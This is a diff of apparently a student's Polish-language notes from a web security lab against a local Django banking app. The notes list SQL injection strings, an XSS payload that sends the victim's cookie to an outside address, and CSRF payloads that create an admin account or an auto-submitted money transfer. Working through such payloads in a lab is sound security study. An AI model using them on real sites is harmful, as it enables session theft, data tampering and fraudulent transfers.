@@ -1,17 +1,32 @@
 1.
+Cross-site scripting (or XSS) allows an attacker to execute arbitrary JavaScript within the browser of a victim user.
+
+Cross-site request forgery (or CSRF) allows an attacker to induce a victim user to perform actions that they do not intend to.
+
 SQL:
 wyświetl dane bez dostępu: agnes" OR "1"="1" --
 dodaje (powinno): agnes" union INSERT INTO accounts_transfer VALUES(1001, 'hacker', 8888888888888888, 'hacking mocny', 87676, 2021-01-16, 1000) --
 
 niestety SQLlite nie pozwala na wiele zapytań podczas jednej realizacji .raw().
+
 XSS i XSRF:
 <script>alert(document.cookie);</script>
 
 mogłoby być coś na kształt:
 <script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>
 albo:
+
 Atakujący rejestruje konto, podając w swoim loginie tag: <img src=”http://pro-forum.sekurak/admin/addUser?login=malgorzata4&pass=1234&type=adm”>
 
+ <body onload="document.forms[0].submit()">
+   <form action="http://127.0.0.1:8000/create_transfer/" method="POST">
+     <input type="hidden" name="receiver_name" value="AttackerA"/>
+     <input type="hidden" name="account_number" value="1001"/>
+     <input type="hidden" name="title" value="moze?"/>
+     <input type="hidden" name="amount" value="123"/>
+     <input type="submit" value="View my pictures!"/>
+   </form>
+ </body>
 
 2.
 $ gunicorn -c conf/gunicorn_config.py Bezp_5.wsgi
@@ -23,4 +38,4 @@ or
 $ sudo systemctl start nginx
 
 3.
-curl -X POST -d '{"username": "test", "password": "ple,kto123"}'  --cookie "csrftoken=d5etPXexOEgmpAl6Yk02VlVWcubwP4hnvKAlPmbKU2NvxQXnhdPSEfoTvY3B2HRq" mojwspanialybank:8000/login/
+curl -X POST -d '{"username": "test", "password": "ple,kto123"}'  --cookie "csrftoken=R5cjh0IeA1dTXQ1tEtgzpzWMoMjiHeezo1zmxtzyhGpB5tzQ8Wh56MWnJq1yo7i0" mojwspanialybank:8000/login/
